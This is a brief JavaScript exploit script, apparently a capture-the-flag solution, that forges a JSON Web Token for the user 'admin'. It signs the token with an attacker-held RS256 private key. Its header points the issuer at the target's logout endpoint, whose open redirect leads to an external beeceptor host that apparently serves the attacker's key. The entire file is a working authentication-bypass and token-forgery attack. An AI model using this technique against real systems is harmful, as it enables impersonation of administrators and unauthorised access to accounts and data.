const fs = require("fs")
const jwt = require("jsonwebtoken")

const user = "admin";
const privatekey = fs.readFileSync("private_key.pem", "utf8");
const token = jwt.sign(
    {
        user,
    },
    privatekey,
    {
        header: {
            alg: "RS256",
            issuer: "http://localhost:8080/logout?redirect=https://satoki-ctf.free.beeceptor.com",
        }
    },
);

console.log(token);